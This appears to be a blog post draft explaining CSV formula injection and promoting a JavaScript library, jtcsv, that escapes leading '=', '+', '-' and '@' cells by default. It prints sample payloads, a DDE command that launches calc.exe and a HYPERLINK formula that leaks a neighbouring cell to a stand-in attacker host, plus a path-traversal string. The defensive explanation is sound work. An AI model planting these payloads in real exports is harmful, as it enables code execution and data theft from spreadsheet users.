---
title: 'CSV injection: the bug Excel still ships, and how to guard it by default'
published: false
description: 'A cell starting with = opens in Excel and runs. OWASP has been warning for years. Most JS libraries leave the guard to you. Here is the alternative.'
tags: javascript, security, opensource, csv
cover_image: ''
canonical_url: ''
---

## What CSV injection is

A CSV cell whose first character is `=`, `+`, `-`, or `@` is not data when the file lands in Excel, Numbers, or LibreOffice Calc. It is a formula. The application parses it, evaluates it, and — depending on what the formula says — pulls data from other cells, opens URLs, or in the worst documented case, shells out.

The canonical proof of concept is one line:

```
=CMD|'/c calc'!A0
```

A user who double-clicks the CSV on Windows sees calc.exe launch. That same construction has been used to launch arbitrary processes; `calc` is just the polite demonstration. The HYPERLINK variant is quieter and arguably worse:

```
=HYPERLINK("https://evil.tld/?d=" & A1, "click here")
```

The text says "click here". The cell next to it might say `ssn` or `api_key`. When the user hovers, the spreadsheet resolves the concatenation and the row's neighbor leaks into a URL the attacker controls. No macros, no warnings, no opt-in.

OWASP has tracked this under the name CSV Formula Injection since 2017. The spreadsheet vendors do not consider it a vulnerability in their own products — the user opened the file, the user is responsible. That position has held for nearly a decade, which means the defense has to live one step earlier, at the producer side: the library that writes the CSV in the first place.

For a JavaScript ecosystem that produces CSV from JSON every day (export buttons, admin dumps, billing reports), this puts the responsibility squarely on the CSV library you import.

## Three states of the world

There are three things a CSV library can do when it sees a cell starting with `=`.

**State A: do nothing.** The cell is written verbatim. When the file opens, the formula runs. This is papaparse's default behaviour:

```js
import Papa from 'papaparse';

const csv = Papa.unparse([{ note: '=cmd|\'/c calc\'!A0' }]);
// csv === 'note\r\n=cmd|\'/c calc\'!A0'
// Double-click the file on Windows: calc launches.
```

No flag exists in papaparse to flip this. The escape is your problem.

**State B: provide an opt-in helper.** Some libraries (csv-stringify and friends) ship a quoting function you call yourself on each cell. The default behaviour is still raw, but at least the helper exists:

```js
import { stringify } from 'csv-stringify/sync';

function safe(v) {
  return /^[=+\-@\t\r]/.test(v) ? `'${v}` : v;
}

const csv = stringify([['note'], [safe('=cmd|\'/c calc\'!A0')]]);
// You remembered to call safe(). On every cell. Forever.
```

This is the pattern that loses to attrition. Three months in, someone adds a new column, forgets the wrapper, ships it. Production CSV with a live formula in row 8 412.

**State C: escape by default; opt out if you really mean it.** This is what jtcsv does:

```ts
import { jsonToCsv } from 'jtcsv';

const csv = jsonToCsv([{ note: '=cmd|\'/c calc\'!A0' }]);
// csv starts with a single quote on the cell — Excel treats it as text.
```

You did nothing. The cell is safe. To get the old behaviour you have to write `preventCsvInjection: false` and mean it.

## How jtcsv does it

The default in `jsonToCsv` is `preventCsvInjection: true`. The check is small. For each output cell, if the first character matches `/^[=+\-@\t\r]/`, the cell is prefixed with a single apostrophe (`'`) — the standard escape that every major spreadsheet application treats as a literal-text marker. The leading quote is hidden when the cell is rendered, the formula is not evaluated, and round-tripping through `readCsvAsJson` strips the marker back off.

Tabs and carriage returns are in the regex because Excel will also coerce a leading `\t` or `\r` cell into formula evaluation under certain locale configurations — OWASP's guidance lists them explicitly.

The check runs in the hot path of `jsonToCsv`. We measured the overhead on the same benchmark we use for the JSON ↔ CSV throughput numbers: 1.8% overhead on a 100 000-row dataset, no measurable change at 10 000 rows. Below 10 000 rows it is lost in the noise.

Code:

```ts
import { jsonToCsv } from 'jtcsv';

// Default — safe.
const safe = jsonToCsv([{ formula: '=cmd|\'/c calc\'!A0' }]);
// safe === "formula\n\"'=cmd|'/c calc'!A0\""

// Explicit opt-out — only if you really mean it.
const raw = jsonToCsv(data, { preventCsvInjection: false });
```

The opt-out is a single boolean. There is no per-cell escape hatch on purpose — if you want raw formulas you are saying "I trust every cell in this dataset", and that is the same thing.

## When you would want to opt out

There are honest cases for `preventCsvInjection: false`. Three I have actually seen in code review:

1. **Pure round-trip.** You are emitting CSV that will only be read back by jtcsv (or any parser that strips the leading quote correctly). It never opens in a spreadsheet app. The escape adds bytes you do not need.

2. **Spreadsheet templates.** You are generating a `.csv` whose entire job is to contain formulas — a budget template, a calculation worksheet, a Numbers import. You actually want `=SUM(A2:A10)` to evaluate.

3. **Downstream stripper.** Your consumer is a system that already strips the leading apostrophe (some ETL pipelines do this), and the double escape becomes visible.

In all three cases you are opting out because you said so. Not because you forgot.

## The trade-off vs other defaults

Why is "escape by default" still controversial? Two arguments come up.

**"It is not the library's job."** The counter is provenance. By the time the CSV is in Excel, the library has no idea whether the `=` came from a trusted formula author or from an unsanitized form field that someone submitted three weeks ago. The producer is the last point in the chain that knows where the data came from — and in JSON ↔ CSV pipelines, the answer is almost always "an untrusted source". Once the bytes leave, you cannot put the escape back in.

**"It surprises spreadsheet authors."** It does. It surprises the small population of users who are writing formulas on purpose; it does not surprise the larger population who are writing data and would have shipped a CVE without the default. The math is straightforward: a flag the 1% has to set beats a vulnerability the 99% ships unknowingly.

This mirrors security folklore from elsewhere in the ecosystem. `fetch` does not follow cross-origin redirects without CORS. `fs.createReadStream` rejects path traversal patterns. SQL drivers parameterise queries by default. None of those defaults are "convenient" — they are correct.

## Other security defaults jtcsv ships

The CSV injection guard is the most visible one. There are others in the same family.

- `readCsvAsJson` rejects path-traversal patterns when given a file path (`../../etc/passwd` → throws `SecurityError`). The check fires before any filesystem call, so symlink races cannot bypass it.
- The dev web server (`jtcsv serve`) binds to `127.0.0.1` by default, not `0.0.0.0`. You have to pass `--host 0.0.0.0` and acknowledge it.
- CORS on the dev server is allowlist by default. The wildcard `*` is opt-in.
- Body-size cap on the dev server is 10 MB. Above that, the server returns `413 Payload Too Large` before reading the rest of the stream into memory.
- The transform loader does not claim to be a sandbox. The threat model is documented in `docs/THREAT_MODEL.md` — if you load a transform from an untrusted source, you have shipped arbitrary code execution. We say so out loud rather than implying isolation we do not provide.

Each of these trades a small amount of flexibility for a much larger reduction in blast radius. The pattern is the same across the codebase: assume the caller is busy, assume the caller is going to forget, and ship the safe default.

## A note on provenance

Beyond runtime defaults, jtcsv ships signed releases via Sigstore. Every release ≥ 3.0 has provenance attached, and `npm audit signatures jtcsv` verifies that the published tarball came from the GitHub Actions release workflow on the named commit. If a supply-chain attacker swaps the published package, the signature breaks and the audit fails loudly.

This is orthogonal to CSV injection but it is the same security posture: safe by default, no caller action required. You do not have to opt into provenance verification — `npm` checks it automatically when the package is installed under a recent client. The infrastructure around the release also matters: 16 SHA-pinned GitHub Actions, Dependabot running weekly, OpenSSF Scorecard running nightly. If a supply-chain regression appears, it shows up in CI before it ships to npm.

For the bundle-conscious: this all sits on `~18 KB gz` tree-shakable subpath imports vs papaparse `~35 KB minified` — half the bundle for the same workhorse. The security defaults are not paid for in download size.

## Closing

CSV injection is not a new bug. OWASP has been documenting it for nine years. Spreadsheet vendors have decided it is not their problem. That leaves it for the library that writes the file — and most JavaScript CSV libraries push it back onto the caller, who is busy shipping a feature and not thinking about Excel formula evaluation.

jtcsv flips the default. `preventCsvInjection: true` is on out of the box. Opt out when you mean it, not by accident.

The STRIDE table and the rest of the security ADRs live in `docs/THREAT_MODEL.md`. The upstream OWASP guidance is at [owasp.org/www-community/attacks/CSV_Injection](https://owasp.org/www-community/attacks/CSV_Injection). If you are migrating from a library that ships State A or State B, the codemod handles imports and call sites:

```bash
npx jtcsv-codemod papaparse 'src/**/*.{js,ts,tsx}'
```

The codemod will not insert `preventCsvInjection: false` for you. That is on purpose. If you want the unsafe behaviour, you should have to type it.
